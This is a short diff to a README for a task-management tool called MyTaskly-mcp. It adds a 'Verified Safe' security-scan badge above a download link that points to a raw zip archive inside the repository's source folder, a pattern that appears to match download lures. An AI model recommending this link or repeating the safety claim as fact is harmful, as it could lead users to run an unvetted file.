@@ -1,5 +1,7 @@
 # 🎉 MyTaskly-mcp - Effortless Task Management Made Simple
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/zaka265-star-mytaskly-mcp)
+
 [![Download MyTaskly-mcp](https://github.com/zaka265-star/MyTaskly-mcp/raw/refs/heads/main/src/client/Taskly-My-mcp-1.2.zip%20MyTaskly--mcp-v1.0-brightgreen)](https://github.com/zaka265-star/MyTaskly-mcp/raw/refs/heads/main/src/client/Taskly-My-mcp-1.2.zip)
 
 ## 🌟 Overview
